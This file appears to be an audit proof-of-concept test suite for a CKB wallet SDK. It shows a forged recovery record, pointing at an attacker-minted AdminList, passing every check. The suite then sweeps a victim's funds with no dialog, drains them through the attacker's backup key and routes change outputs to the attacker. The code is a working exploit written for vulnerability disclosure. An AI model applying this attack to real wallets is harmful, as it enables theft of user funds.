// Audit PoC (audit/omnilock-fable-5-1): nothing ties a stored recovery record to the user except the database row.
// Anyone who can write the wallet row (a compromised database or admin, an SQL injection elsewhere, a rogue
// operator) can point an account at an AdminList *they* minted, whose whitelist holds *their* backup. From then on
// the sign-in sweep moves the user's old-address funds there with the user's own Lit signature and no dialog, the
// SDK shows that address as the user's, every change output goes there, and the attacker's backup can spend it all
// through Omnilock's administrator path. No Lit API key is needed.
import assert from "node:assert/strict";
import test from "node:test";
import * as ccc from "@ckb-ccc/core";
import { secp256k1 } from "@noble/curves/secp256k1.js";
import { keccak_256 } from "@noble/hashes/sha3.js";
import {
  adminListTypeScript,
  KeyWayAccountSigner,
  omnilockArgsFor,
  parseRecovery,
  refuseForeignOmnilockOutputs,
  secp256k1Lock,
  type KeyWayRecovery,
} from "../src/sdk/browser/account-lock.ts";
import { backupAuth, evmOmnilockMessage, type RecoveryBackup } from "../src/sdk/browser/recovery-backups.ts";
import { readRecoveryList, recoveryListRecord, setRecoveryListRecord } from "../src/sdk/browser/recovery-list.ts";
import { adminListData, whitelistTree } from "../src/sdk/browser/recovery-smt.ts";
import { signRecoverySpendWithEvm } from "../src/sdk/browser/recovery-spend.ts";
import { formatCkbSignature, signAccountGroups } from "../src/server/funding-transaction.ts";
import { checkLegacySweepTransaction, planLegacySweep } from "../src/server/legacy-sweep.ts";
import { previewGeneralTransaction } from "../src/server/transaction-policy.ts";
import type { ReadyWallet } from "../src/server/user-wallet.ts";

const CKB = 100_000_000n;
// The victim's Lit key (the attacker never has it) and the attacker's own keys.
const victimKey = secp256k1.utils.randomSecretKey();
const victimPublicKey = ccc.hexFrom(secp256k1.getPublicKey(victimKey, true));
const attackerKey = secp256k1.utils.randomSecretKey();
const attackerPublicKey = ccc.hexFrom(secp256k1.getPublicKey(attackerKey, true));
const attackerEvmKey = secp256k1.utils.randomSecretKey();
const attackerEvm = ccc.hexFrom(keccak_256(secp256k1.getPublicKey(attackerEvmKey, false).slice(1)).slice(12));

async function offlineClient(cells: ccc.Cell[], transactions: ccc.Transaction[] = []): Promise<ccc.Client> {
  const client = new ccc.ClientPublicTestnet({ url: "https://testnet.ckb.dev/" });
  await client.cache.recordCells(cells);
  Object.assign(client, {
    findSingletonCellByType: async (type: ccc.ScriptLike) => cells.find((cell) => cell.cellOutput.type?.eq(ccc.Script.from(type))),
    getTransaction: async (hash: ccc.HexLike) => {
      const transaction = transactions.find((candidate) => candidate.hash() === ccc.hexFrom(hash));
      return transaction ? { transaction, status: "committed" } : undefined;
    },
    findCells: async function* () {},
    findCellsByLock: async function* (lock: ccc.ScriptLike) {
      for (const cell of cells) if (cell.cellOutput.lock.eq(ccc.Script.from(lock))) yield cell;
    },
  });
  return client;
}

let nextCell = 1;
const cell = (lock: ccc.Script, capacity: bigint, type?: ccc.Script, outputData: ccc.Hex = "0x") =>
  ccc.Cell.from({ outPoint: { txHash: `0x${(nextCell++).toString(16).padStart(64, "0")}`, index: 0 }, cellOutput: { lock, capacity, type }, outputData });

const sign = (key: Uint8Array) => async (digest: ccc.Hex) => {
  const raw = secp256k1.sign(ccc.bytesFrom(digest), key, { prehash: false, format: "recovered" });
  return formatCkbSignature({ recoveryParam: raw[0] as 0 | 1, r: ccc.hexFrom(raw.slice(1, 33)), s: ccc.hexFrom(raw.slice(33, 65)) });
};

/**
 * The attacker mints an AdminList from their own cell: Type ID args from their input, lock = the victim's
 * Omnilock in administrator mode naming that Type ID, whitelist = the attacker's EVM wallet, and the record
 * KeyWay's readers expect. Every field of the recovery record then checks out against the victim's public key.
 */
async function attackerMintsList(base: ccc.Client) {
  const attackerSecp = await secp256k1Lock(base, attackerPublicKey);
  const funding = cell(attackerSecp, 500n * CKB);
  const input0 = ccc.CellInput.from({ previousOutput: funding.outPoint });
  const adminType = adminListTypeScript({ adminListTypeArgs: ccc.hashTypeId(input0, 0) });
  const omnilock = await ccc.Script.fromKnownScript(base, ccc.KnownScript.OmniLock, omnilockArgsFor(victimPublicKey, adminType.hash()));
  const backups: RecoveryBackup[] = [{ kind: "evm", address: attackerEvm }];
  const { root } = whitelistTree(await Promise.all(backups.map((backup) => backupAuth(base, backup))));
  const mint = ccc.Transaction.from({
    inputs: [input0],
    outputs: [{ lock: omnilock, type: adminType, capacity: 197n * CKB }, { lock: attackerSecp, capacity: 302n * CKB }],
    outputsData: [adminListData(root), "0x"],
  });
  await mint.addCellDepsOfKnownScripts(base, ccc.KnownScript.Secp256k1Blake160);
  mint.witnesses = [ccc.hexFrom(ccc.WitnessArgs.from({ lock: ccc.hexFrom(new Uint8Array(65)) }).toBytes())];
  setRecoveryListRecord(mint, 0, await recoveryListRecord(base, backups));
  await offlineClient([funding]).then((client) => signAccountGroups(mint, [{ script: attackerSecp, kind: "secp256k1" }], client, sign(attackerKey)));
  const adminList = ccc.Cell.from({ outPoint: { txHash: mint.hash(), index: 0 }, cellOutput: mint.outputs[0], outputData: mint.outputsData[0] });
  const forged: KeyWayRecovery = {
    omnilockArgs: omnilock.args,
    adminListTypeArgs: adminType.args,
    adminListTypeHash: adminType.hash(),
    adminListOutPoint: { txHash: mint.hash(), index: 0 },
    legacyAddress: ccc.Address.fromScript(await secp256k1Lock(base, victimPublicKey), base).toString(),
    enabledAt: new Date().toISOString(),
    backups,
  };
  return { mint, adminList, omnilock, forged, backups };
}

const walletWith = (recovery: KeyWayRecovery) => ({
  version: 1, status: "ready", litPkpId: `0x${"11".repeat(20)}`, litPublicKey: victimPublicKey, ckbAddress: "ckt1forged",
  encryptedFiberKey: "ciphertext", primaryDeviceIdHash: "a".repeat(64), hasOpenedChannel: false,
  createdAt: "2026-10-29T00:00:00.000Z", updatedAt: "2026-10-29T00:00:00.000Z", recovery,
}) as ReadyWallet;

test("PoC: a recovery record pointing at an attacker-minted AdminList passes every check KeyWay has", async () => {
  const base = await offlineClient([]);
  const { adminList, forged, omnilock, mint } = await attackerMintsList(base);
  // readWallet's validation accepts it: all it checks is internal consistency with the victim's public key.
  assert.deepEqual(parseRecovery(forged, victimPublicKey), forged);
  // The chain-side readers accept it too, and they name the attacker as the only backup.
  const client = await offlineClient([adminList], [mint]);
  const list = await readRecoveryList(client, forged);
  assert.deepEqual(list.entries.map(({ backup }) => backup), [{ kind: "evm", address: attackerEvm }]);
  assert.ok(list.cell.cellOutput.lock.eq(omnilock), "the AdminList is locked by the victim's Omnilock, as a genuine one would be");
  // The SDK would show the attacker's address as the account's.
  const signer = new KeyWayAccountSigner(client, victimPublicKey, forged);
  assert.equal(await signer.getRecommendedAddress(), ccc.Address.fromScript(omnilock, client).toString());
});

test("PoC: the sign-in sweep then moves the victim's old-address funds to the attacker-listed address, signed by the victim's key with no dialog", async () => {
  const base = await offlineClient([]);
  const { adminList, forged, omnilock, mint } = await attackerMintsList(base);
  const victimSecp = await secp256k1Lock(base, victimPublicKey);
  const legacyFunds = cell(victimSecp, 5_000n * CKB);
  const client = await offlineClient([adminList, legacyFunds], [mint]);

  const plan = await planLegacySweep(client, walletWith(forged));
  assert.equal(plan.status, "ready");
  if (plan.status !== "ready") return;
  await checkLegacySweepTransaction(client, plan.transaction, victimPublicKey, forged);
  const signed = await signAccountGroups(plan.transaction, plan.groups, client, sign(victimKey));
  assert.ok(signed.outputs.every((output) => output.lock.eq(omnilock)), "everything goes to the Omnilock whose list the attacker controls");
  assert.ok(signed.outputs[0].capacity > 4_999n * CKB);

  // And the attacker's backup can sign it away: the witness carries its identity and proof against the forged list.
  const list = await readRecoveryList(client, forged);
  const swept = ccc.Cell.from({ outPoint: { txHash: signed.hash(), index: 0 }, cellOutput: signed.outputs[0], outputData: "0x" });
  const after = await offlineClient([adminList, swept], [mint]);
  const attackerSecp = await secp256k1Lock(base, attackerPublicKey);
  const drain = ccc.Transaction.from({ inputs: [{ previousOutput: swept.outPoint }], outputs: [{ lock: attackerSecp, capacity: 4_999n * CKB }], outputsData: ["0x"] });
  let shown = "";
  const wallet = {
    request: async ({ method, params }: { method: string; params?: unknown[] }) => {
      if (method !== "personal_sign") throw new Error(method);
      shown = new TextDecoder().decode(ccc.bytesFrom(params![0] as string));
      const bytes = ccc.bytesFrom(params![0] as string);
      const digest = keccak_256(ccc.bytesConcat(new TextEncoder().encode(`\x19Ethereum Signed Message:\n${bytes.length}`), bytes));
      const raw = secp256k1.sign(digest, attackerEvmKey, { prehash: false, format: "recovered" });
      return ccc.hexFrom(ccc.bytesConcat(raw.slice(1), [raw[0] + 27]));
    },
  };
  const spend = await signRecoverySpendWithEvm(drain, { client: after, lock: omnilock, list: list.entries, entry: list.entries[0], adminList: adminList.outPoint }, wallet);
  // The text the wallet signed is the group's sighash (witness lock zeroed at its final length), as Omnilock computes it.
  const witness = spend.getWitnessArgsAt(0)!;
  assert.ok(ccc.bytesFrom(witness.lock!).length > 85, "an administrator-path witness, not the owner's");
  const zeroed = spend.clone();
  zeroed.setWitnessArgsAt(0, ccc.WitnessArgs.from({ ...witness, lock: ccc.hexFrom(new Uint8Array(ccc.bytesFrom(witness.lock!).length)) }));
  assert.equal(shown, evmOmnilockMessage((await zeroed.getSignHashInfo(omnilock, after))!.message));
});

test("PoC: ordinary signing sends every change output to the forged address as well", async () => {
  const base = await offlineClient([]);
  const { adminList, forged, omnilock, mint } = await attackerMintsList(base);
  const victimSecp = await secp256k1Lock(base, victimPublicKey);
  const legacyFunds = cell(victimSecp, 1_000n * CKB);
  const client = await offlineClient([adminList, legacyFunds], [mint]);
  const omni = await client.getKnownScript(ccc.KnownScript.OmniLock);
  const payee = await secp256k1Lock(base, attackerPublicKey);
  const transaction = ccc.Transaction.from({
    inputs: [{ previousOutput: legacyFunds.outPoint }],
    outputs: [{ lock: payee, capacity: 100n * CKB }, { lock: omnilock, capacity: 900n * CKB - 100_000n }],
    outputsData: ["0x", "0x"],
  });
  await transaction.addCellDepsOfKnownScripts(client, ccc.KnownScript.Secp256k1Blake160);
  transaction.witnesses = [ccc.hexFrom(ccc.WitnessArgs.from({ lock: ccc.hexFrom(new Uint8Array(65)) }).toBytes())];
  // With a genuine record this is the guard that keeps change at the account's own list; it has no way to tell.
  refuseForeignOmnilockOutputs(transaction, omni, victimPublicKey, forged);
  const validated = await previewGeneralTransaction(walletWith(forged), transaction, client);
  assert.equal(validated.preview.recipients.length, 1, "the change output is treated as the user's own");
  assert.equal(validated.preview.sendingCkb, "100");
  assert.equal(validated.preview.details.outputs[1].lock, "you");
});
